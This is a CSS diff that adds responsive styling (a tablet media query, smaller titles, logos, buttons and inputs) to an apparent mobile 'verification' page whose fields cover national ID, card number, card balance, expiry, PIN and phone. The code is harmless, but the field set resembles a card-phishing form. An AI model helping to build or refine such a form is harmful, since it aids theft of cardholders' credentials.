@@ -276,6 +276,15 @@ body {
     width: 100%;
 }
 
+.verification-title {
+    font-size: 24px;
+    color: #1a1a1a;
+    margin-bottom: 30px;
+    font-weight: 700;
+    text-align: center;
+    width: 100%;
+}
+
 /* Phone Input */
 .phone-input-container {
     display: flex;
@@ -622,6 +631,22 @@ body {
     opacity: 0.8;
 }
 
+/* Tablet Responsive */
+@media (max-width: 768px) and (min-width: 481px) {
+    .mobile-frame {
+        max-width: 90%;
+        max-height: 95vh;
+    }
+    
+    .container {
+        padding: 20px;
+    }
+    
+    .notice-modal {
+        max-width: 350px;
+    }
+}
+
 /* Responsive */
 @media (max-width: 480px) {
     body {
@@ -679,6 +704,25 @@ body {
         max-width: 100%;
     }
     
+    .verification-title {
+        font-size: 20px;
+        margin-bottom: 25px;
+    }
+    
+    .page-title,
+    .security-heading {
+        font-size: 20px;
+        margin-bottom: 20px;
+    }
+    
+    .header {
+        margin-bottom: 30px;
+    }
+    
+    .form-section {
+        margin-bottom: 25px;
+    }
+    
     .row-inputs {
         flex-direction: row;
         gap: 10px;
@@ -695,6 +739,24 @@ body {
         height: 55px;
         font-size: 20px;
     }
+    
+    .welcome-text > div:first-child {
+        font-size: 14px;
+    }
+    
+    .brand-name {
+        font-size: 20px;
+    }
+    
+    .logo {
+        width: 45px;
+        height: 45px;
+    }
+    
+    .start-btn {
+        font-size: 16px;
+        padding: 16px;
+    }
 }
 
 /* Extra small devices (phones in portrait) */
@@ -705,6 +767,30 @@ body {
     
     .notice-modal {
         padding: 20px 15px;
+        max-width: calc(100% - 20px);
+    }
+    
+    .verification-title {
+        font-size: 18px;
+        margin-bottom: 20px;
+    }
+    
+    .page-title,
+    .security-heading {
+        font-size: 18px;
+    }
+    
+    .welcome-text > div:first-child {
+        font-size: 13px;
+    }
+    
+    .brand-name {
+        font-size: 18px;
+    }
+    
+    .logo {
+        width: 40px;
+        height: 40px;
     }
     
     .row-inputs {
@@ -720,6 +806,27 @@ body {
         width: 42px;
         height: 50px;
         font-size: 18px;
+    }
+    
+    .start-btn {
+        font-size: 15px;
+        padding: 15px;
+    }
+    
+    .input-label {
+        font-size: 13px;
+    }
+    
+    .cpr-input,
+    .card-input,
+    .balance-input,
+    .phone-input,
+    .expiry-input,
+    .pin-input,
+    .month-input,
+    .year-input {
+        padding: 14px;
+        font-size: 15px;
     }
 }
 
